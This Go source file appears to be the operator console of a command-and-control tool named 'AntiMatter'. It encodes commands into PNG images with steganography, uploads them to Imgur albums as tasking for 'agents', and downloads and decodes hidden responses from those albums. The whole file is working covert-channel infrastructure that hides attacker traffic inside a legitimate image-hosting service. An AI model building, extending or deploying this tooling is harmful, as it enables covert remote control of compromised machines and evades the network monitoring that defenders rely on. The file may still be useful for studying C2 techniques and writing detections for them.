package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"image/png"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"reflect"
	"sort"
	"strconv"
	"strings"

	stego "github.com/auyer/steganography"
	"github.com/fatih/color"
	"github.com/jwangsadinata/go-multimap/slicemultimap"
	"github.com/manifoldco/promptui"
)

/*
// Album is a type to handle the album creation
type Album struct {
	deleteHash string
	albumID    string
}
*/

// AlbumImages is a struct to hold the relevant image info after uploading to an album
type AlbumImages struct {
	ImageID     string `json:"id"`
	ImageTitle  string `json:"title"`
	Description string `json:"description"`
	ImageLink   string `json:"link"`
}

// validateOptions is a function that just helps check to make sure you're choosing a correct option
func validateOptions(slice []string, val string) bool {
	for _, item := range slice {
		if strings.EqualFold(item, val) {
			return true
		}
	}
	return false
}

// Global map for the Image module
var imageOptions = map[string]string{"Command": "", "BaseImage": "", "NewFilename": "", "ClientID": "", "AlbumID": ""}

// Global map for the Album module
var albumOptions = map[string]string{"Title": "", "Client-ID": "", "AlbumID": "", "Album Delete-Hash": ""}

// Global map for the Task module
var taskOptions = map[string]string{"TaskingImage": "", "Title": "", "DeleteHash": "", "Description": "", "ClientID": ""}

// Global map for the Response module
var responseOptions = map[string]string{"AlbumID": "", "ClientID": ""}

// Global multimap for holding several different types of variables returned from the imgur API
var imgurItems = slicemultimap.New() // empty

// createImage is a function that uses the stego lib to encode an image you define and then write it to a new image
func createImage(command string, origPic string, newPic string) {
	inFile, _ := os.Open(origPic)
	reader := bufio.NewReader(inFile)
	img, _ := png.Decode(reader)

	w := new(bytes.Buffer)
	err := stego.Encode(w, img, []byte(command))
	if err != nil {
		fmt.Printf("Error encoding file %v", err)
	} else {
		fmt.Println(color.GreenString("\n[+]"), "Success creating encoded image!\n")

	}

	outFile, _ := os.Create(newPic)
	w.WriteTo(outFile)
	outFile.Close()

}

// createAlbum queries the Imgur API in order to create an anonymous album, using a client ID
func createAlbum(title string, clientID string) (albumID, deleteHash interface{}) {

	apiURL := "https://api.imgur.com"
	resource := "/3/album/"
	data := url.Values{}
	data.Set("title", title)

	u, _ := url.ParseRequestURI(apiURL)
	u.Path = resource
	urlStr := u.String() // "https://api.com/user/"

	client := &http.Client{}
	r, _ := http.NewRequest("POST", urlStr, strings.NewReader(data.Encode())) // URL-encoded payload
	r.Header.Add("Authorization", "Client-ID "+clientID)
	r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	r.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))

	resp, _ := client.Do(r)
	var result map[string]interface{}

	json.NewDecoder(resp.Body).Decode(&result)

	nestedMap := result["data"]
	newMap, _ := nestedMap.(map[string]interface{})

	albumID = newMap["id"]
	deleteHash = newMap["deletehash"]

	fmt.Println(color.GreenString("\n[+]"), "Successfully created an album with the following values:")
	fmt.Println(color.GreenString("albumID:"), albumID, color.GreenString("Album DeleteHash:"), deleteHash, "\n")

	return albumID, deleteHash

}

func uploadImage(imageFile string, title string, album string, description string, clientID string) (imageID, deleteHash interface{}) {
	url := "https://api.imgur.com/3/image"
	method := "POST"
	var params = map[string]string{"image": imageFile, "title": title, "album": album, "description": description}

	payload := &bytes.Buffer{}
	writer := multipart.NewWriter(payload)

	// This for loop is to send multiple multipart parameters, that are mapped above
	for key, val := range params {
		_ = writer.WriteField(key, val)
	}

	err := writer.Close()
	if err != nil {
		fmt.Println(err)
	}

	client := &http.Client{}
	req, err := http.NewRequest(method, url, payload)

	if err != nil {
		fmt.Println(err)
	}
	req.Header.Add("Authorization", "Client-ID "+clientID)

	req.Header.Set("Content-Type", writer.FormDataContentType())
	res, err := client.Do(req)
	var result map[string]interface{}

	json.NewDecoder(res.Body).Decode(&result)

	nestedMap := result["data"]
	newMap, _ := nestedMap.(map[string]interface{})

	imageID = newMap["id"]
	deleteHash = newMap["deletehash"]

	fmt.Println(color.GreenString("[+] Tasking upload success!"))
	fmt.Println(color.GreenString("\nTask Image ID is:"), imageID, "|", color.GreenString("Task Image DeleteHash is:"), deleteHash, "\n")

	return imageID, deleteHash

}

func addImage(albumDeleteHash string, clientID string, imgDeleteHash string) (success, status interface{}) {
	// THis hash is the album deleteHash
	url := "https://api.imgur.com/3/album/" + albumDeleteHash
	method := "POST"

	payload := &bytes.Buffer{}
	writer := multipart.NewWriter(payload)
	// This hash is the image deleteHash
	_ = writer.WriteField("deletehashes[]", imgDeleteHash)
	err := writer.Close()
	if err != nil {
		fmt.Println(err)
	}

	client := &http.Client{}
	req, err := http.NewRequest(method, url, payload)

	if err != nil {
		fmt.Println(err)
	}
	req.Header.Add("Authorization", "Client-ID "+clientID)

	req.Header.Set("Content-Type", writer.FormDataContentType())
	res, err := client.Do(req)
	var result map[string]interface{}

	json.NewDecoder(res.Body).Decode(&result)

	success = result["success"]
	status = result["status"]

	return success, status

}

func getAlbumImages(albumID string, clientID string) (imageLink interface{}) {
	// This hash is the albumID hash
	url := "https://api.imgur.com/3/album/" + albumID + "/images"
	method := "GET"

	payload := &bytes.Buffer{}
	writer := multipart.NewWriter(payload)
	err := writer.Close()
	if err != nil {
		fmt.Println(err)
	}

	client := &http.Client{}
	req, err := http.NewRequest(method, url, payload)

	if err != nil {
		fmt.Println(err)
	}
	req.Header.Add("Authorization", "Client-ID "+clientID)

	req.Header.Set("Content-Type", writer.FormDataContentType())
	res, err := client.Do(req)
	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)

	stripResponse := strings.NewReplacer(`{"data":[`, "", "]", "", ":[", ":0", `"}`, `"`, `\`, "")
	//Init the AlbumImages struct
	content := AlbumImages{}

	newResponse := stripResponse.Replace(string(body))

	json.Unmarshal([]byte(newResponse), &content)

	v := reflect.ValueOf(content)
	typeOfS := v.Type()

	for i := 0; i < v.NumField(); i++ {
		fmt.Printf("[+] %s: %v\n", typeOfS.Field(i).Name, v.Field(i).Interface())
	}

	link := v.Field(3).Interface()
	//fmt.Printf("%+v\n", content)

	return link

}

// yesNo() is just a function that helps ask the user yes or no lmao
func yesNo() bool {
	prompt := promptui.Select{
		Label: "Would you like to upload most recently created image to this album?[Yes/No]",
		Items: []string{"Yes", "No"},
	}
	_, result, err := prompt.Run()
	if err != nil {
		log.Fatalf("Prompt failed %v\n", err)
	}
	return result == "Yes"
}

func getImage() bool {
	prompt := promptui.Select{
		Label: "Would you like to upload most recently created image to this album?[Yes/No]",
		Items: []string{"Yes", "No"},
	}
	_, result, err := prompt.Run()
	if err != nil {
		log.Fatalf("Prompt failed %v\n", err)
	}
	return result == "Yes"
}

func decodeImage() {
	inFile, _ := os.Open("cool.png")
	defer inFile.Close()

	reader := bufio.NewReader(inFile)
	img, _ := png.Decode(reader)

	sizeOfMessage := stego.GetMessageSizeFromImage(img)

	msg := stego.Decode(sizeOfMessage, img)
	fmt.Println(string(msg))
}

// This is a mess, defines way too much. Defines everything needed for the promptui
// Defines different options to choose for an operator
// Handles the user defined varibles and stores them in a global map
func main() {
	for {
		options := []string{"Options", "Image", "Album", "Agent", "Task", "List", "Delete", "Response", "Exit", "Quit", "testHttp"}
		validate := func(input string) error {
			// _, err := strconv.ParseFloat(input, 64)
			found := validateOptions(options, input)

			if !found {
				return errors.New("Invalid Option")
			}

			return nil
		}

		// Each template displays the data received from the prompt with some formatting.
		templates := &promptui.PromptTemplates{
			Prompt:  "{{ . }} ",
			Valid:   "{{ . | green }} ",
			Invalid: "{{ . | red }} ",
			Success: "{{ . | cyan }} ",
		}

		prompt := promptui.Prompt{
			Label:     "AntiMatter >",
			Templates: templates,
			Validate:  validate,
		}

		result, err := prompt.Run()

		if err != nil {
			fmt.Printf("Prompt failed %v\n", err)
			return
		}

		//fmt.Printf("You chose %q\n", result)

		if strings.EqualFold(result, "options") {
			fmt.Println("")
			fmt.Println("Valid Commands		Description")
			fmt.Println("---------------         ------------") // Literally just aethetic
			fmt.Println("\n")
			fmt.Println(" Image		Create an Image for agent tasking")
			fmt.Println(" Album		Create an Album for agent responses")
			fmt.Println(" Task		Create Tasking for agent")
			fmt.Println(" List		List images, albums, agents, and tasks")
			fmt.Println(" Response	Search for any pending responses within an album")
			fmt.Println(" Options	List out different options/modules you can choose from")
			fmt.Println(" Exit		Exit program")
			fmt.Println("")
		}

		if strings.EqualFold(result, "exit") {
			os.Exit(0)
		}

		if strings.EqualFold(result, "Image") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Image > ")
				color.Unset()
				text, _ := reader.ReadString('\n')

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println("\n---OPTIONS---")
					// Check to see if this value is set from the Album module
					//if val, ok := albumOptions["Client-ID"]; ok {
					//		imageOptions["ClientID"] = val
					//	}
					if val, ok := albumOptions["AlbumID"]; ok {
						imageOptions["AlbumID"] = val
					}
					for key, value := range imageOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}
					fmt.Println("\n")
				} else if strings.Contains(text, "set") {
					if strings.Contains(text, "command") {
						command := strings.Split(text, "command ")
						imageOptions["Command"] = strings.Replace(strings.Join(command[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "base-image") {
						baseImage := strings.Split(text, "base-image ")
						imageOptions["BaseImage"] = strings.Replace(strings.Join(baseImage[1:], ""), "\n", "", -1)
					} else if strings.Contains(text, "new-filename") {
						newFilename := strings.Split(text, "new-filename ")
						imageOptions["NewFilename"] = strings.Replace(strings.Join(newFilename[1:], ""), "\n", "", -1)
					} else if strings.Contains(text, "client-id") {
						clientID := strings.Split(text, "client-id ")
						imageOptions["ClientID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)
					} else if strings.Contains(text, "album-id") {
						albumID := strings.Split(text, "album-id ")
						imageOptions["AlbumID"] = strings.Replace(strings.Join(albumID[1:], ""), "\n", "", -1)
					}

				} else if strings.Contains(text, "go") {
					createImage(imageOptions["Command"], imageOptions["BaseImage"], imageOptions["NewFilename"])

				} else if strings.Contains(text, "exit") {
					break
				}

			}
		}
		/*
			if strings.EqualFold(result, "testHttp") {
				albumID, deleteHash := createAlbum("test", "bc8c890066d6157")
				fmt.Println(color.GreenString("[+]"), "Successfully created an album with the following values:")
				fmt.Println(color.GreenString("albumID:"), albumID, color.GreenString("deletehash:"), deleteHash)

			}
		*/

		if strings.EqualFold(result, "Album") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Album > ")
				color.Unset()
				// Had to do this since case sensitivity is dumb in golang
				initialText, _ := reader.ReadString('\n')
				text := strings.ToLower(initialText)

				// Check to see if this value was set in the Image module
				if val, ok := imageOptions["ClientId"]; ok {
					albumOptions["Client-ID"] = val
				}

				// Check to see if this value was set in the Image module
				if val, ok := imageOptions["AlbumId"]; ok {
					albumOptions["AlbumID"] = val
				}

				// Check to see if this value was set in the Image module
				if val, ok := imageOptions["ClientID"]; ok {
					albumOptions["Client-ID"] = val
				}

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println("\n---OPTIONS---")

					for key, value := range albumOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}

					fmt.Println("\n")
				} else if strings.Contains(text, "set") {
					if strings.Contains(text, "title") {
						title := strings.Split(text, "title ")
						albumOptions["Title"] = strings.Replace(strings.Join(title[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "client-id") {
						clientID := strings.Split(text, "client-id ")
						albumOptions["Client-ID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)
					}

				} else if strings.Contains(text, "list") {
					fmt.Println(color.CyanString("AlbumHash:"), albumOptions["Delete-Hash"], "|", color.CyanString("Album ID:"), albumOptions["AlbumID"])

				} else if strings.Contains(text, "go") {
					albumID, deletehash := createAlbum(albumOptions["Title"], albumOptions["Client-ID"])
					albumOptions["AlbumID"] = albumID.(string)
					albumOptions["Album Delete-Hash"] = deletehash.(string)

				} else if strings.Contains(text, "exit") {
					break
				}

			}

		}
		if strings.EqualFold(result, "Task") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgHiYellow)
				fmt.Print("AntiMatter/Task > ")
				color.Unset()
				// Had to do this since case sensitivity is dumb in golang
				initialText, _ := reader.ReadString('\n')
				text := strings.ToLower(initialText)

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println("\n---OPTIONS---")

					// Check to see if this value was set in the Image module
					if val, ok := imageOptions["ClientID"]; ok {
						taskOptions["ClientID"] = val
					}
					// Check to see if this value was set in the Album module (it should have been, add error handling if not)
					if val, ok := albumOptions["Delete-Hash"]; ok {
						taskOptions["DeleteHash"] = val
					}

					for key, value := range taskOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}
					fmt.Println("\n")
					// var taskOptions = map[string]string{"TaskingImage": "", "Title": "", "Description": "", "ClientID": ""}
					// func uploadImage(imageFile string, title string, description string, clientID string)
				} else if strings.Contains(text, "set") {
					if strings.Contains(text, "title") {
						taskTitle := strings.Split(text, "title ")
						taskOptions["Title"] = strings.Replace(strings.Join(taskTitle[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "tasking-image") {

						taskImage := strings.Split(text, "tasking-image ")

						// Open local image file
						f, _ := os.Open("./" + strings.Replace(strings.Join(taskImage[1:], ""), "\n", "", -1))

						reader := bufio.NewReader(f)
						content, _ := ioutil.ReadAll(reader)
						// Convert image file data to base64
						encoded := base64.StdEncoding.EncodeToString(content)
						taskOptions["TaskingImage"] = encoded

					} else if strings.Contains(text, "delete-hash") {
						deleteHash := strings.Split(text, "delete-hash ")
						taskOptions["DeleteHash"] = strings.Replace(strings.Join(deleteHash[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "description") {
						taskDescrip := strings.Split(text, "description ")
						taskOptions["Description"] = strings.Replace(strings.Join(taskDescrip[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "client-id") {
						clientID := strings.Split(text, "client-id ")
						taskOptions["ClientID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)

					}

				} else if strings.Contains(text, "go") {
					imageID, deletehash := uploadImage(taskOptions["TaskingImage"], taskOptions["Title"], taskOptions["AlbumID"], taskOptions["Description"], taskOptions["ClientID"])

					imgurItems.Put("ImageID", imageID)
					imgurItems.Put("ImageDeleteHash", deletehash)

					// Here ask the user if they want to upload the previously created image to this new album

					confirmAdd := yesNo()
					if confirmAdd {
						addImage(albumOptions["Album Delete-Hash"], imageOptions["ClientID"], deletehash.(string))
						fmt.Println(color.GreenString("[+]"), "Successfully upload image to Album:", albumOptions["Title"])
					}
					//fmt.Println(success, "|", status)

				} else if strings.Contains(text, "exit") {
					break
				} else if strings.Contains(text, "list") {
					values := imgurItems.Values() // Grabs values in random order

					// Workaround to make sure we grab values in a sorted order every time
					tmp := make([]string, len(values))
					count := 0
					for _, value := range values {
						tmp[count] = value.(string)
						count++
					}
					sort.Strings(tmp)

					// DeleteHash == 15 bytes long
					// ImageID == 7 bytes long

					// Check the lengths to appropriately label values
					for _, items := range tmp {
						if len(items) == 15 {
							fmt.Println(color.GreenString("Image Delete Hash is:"), items, "\n")
						} else if len(items) == 7 {
							fmt.Println(color.GreenString("\nImage ID is:"), items)
						}
					}

				}

			}

		}
		/*
		 My thought right now is that this will look for any descriptions that mention the word "response"
		 For right now, and then maybe get a big dict of words that will mean specific things

		 Beta build:
		 1. Search albumOptions["AlbumID"] using API for images
		 2. Search through their descriptions to see if any say "response" in them
		 3. If they do, pull the link from the data and grab that image and decode it
		 4. Store the decoded info into resonseOptions["Response-Data"]
		 5. Give to user



		*/
		if strings.EqualFold(result, "Response") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Response > ")
				color.Unset()
				// Had to do this since case sensitivity is dumb in golang
				initialText, _ := reader.ReadString('\n')
				text := strings.ToLower(initialText)

				if val, ok := albumOptions["AlbumID"]; ok {
					responseOptions["AlbumID"] = val
				}

				if val, ok := albumOptions["Client-ID"]; ok {
					responseOptions["ClientID"] = val

				}

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println("\n---OPTIONS---")

					for key, value := range responseOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}
					fmt.Println("\n")

				} else if strings.Contains(text, "check") {
					albumID := responseOptions["AlbumID"]
					clientID := responseOptions["ClientID"]

					linkImage := getAlbumImages(albumID, clientID)

					response, e := http.Get(linkImage.(string))
					if e != nil {
						log.Fatal(e)
					}
					defer response.Body.Close()

					//open a file for writing
					file, err := os.Create("/tmp/asdf.jpg")
					if err != nil {
						log.Fatal(err)
					}
					defer file.Close()

					// Use io.Copy to just dump the response body to the file. This supports huge files
					_, err = io.Copy(file, response.Body)
					if err != nil {
						log.Fatal(err)
					}
					fmt.Println("Get response: Success!\n")
					fmt.Println("Response:\n")

					decodeImage()

				} else if strings.Contains(text, "exit") {
					break
				}
			}
		}

		if strings.EqualFold(result, "") {
		}
		if strings.EqualFold(result, "") {
		}
	}
}
